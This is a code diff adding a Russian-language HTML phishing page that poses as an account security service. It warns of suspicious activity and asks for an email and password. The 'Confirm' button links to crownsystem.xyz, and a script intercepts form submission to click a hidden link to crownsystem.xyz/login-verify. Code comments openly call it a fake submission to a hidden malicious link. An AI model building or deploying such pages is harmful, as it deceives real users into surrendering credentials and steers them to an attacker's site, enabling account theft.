@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Служба Безопасности | Подтверждение Аккаунта</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #f9f9f9;
+            padding: 50px;
+            color: #333;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        h1 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #d32f2f;
+        }
+        label {
+            display: block;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 6px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+        .submit-btn {
+            margin-top: 20px;
+            width: 100%;
+            padding: 12px;
+            background-color: #1976d2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .submit-btn:hover {
+            background-color: #1565c0;
+        }
+        .note {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #888;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠ Подтвердите свою личность</h1>
+        <p>Мы обнаружили подозрительную активность в вашем аккаунте. Пожалуйста, войдите, чтобы восстановить доступ.</p>
+        <form id="login-form">
+            <label for="email">Электронная почта</label>
+            <input type="text" id="email" name="email" required>
+
+            <label for="password">Пароль</label>
+            <input type="password" id="password" name="password" required>
+
+            <a href="http://crownsystem.xyz" class="submit-btn" style="text-decoration: none; display: block; text-align: center;">
+                Подтвердить
+            </a>
+        </form>
+        <p class="note">© 2025 Security System Inc.</p>
+    </div>
+
+    <script>
+        // Поддельная отправка формы — открытие скрытой вредоносной ссылки
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Скрытая вредоносная ссылка (переход на crownsystem.xyz)
+            const hiddenLink = document.createElement('a');
+            hiddenLink.href = 'http://crownsystem.xyz/login-verify';
+            hiddenLink.style.display = 'none';
+            document.body.appendChild(hiddenLink);
+            hiddenLink.click();
+        });
+    </script>
+</body>
+</html>
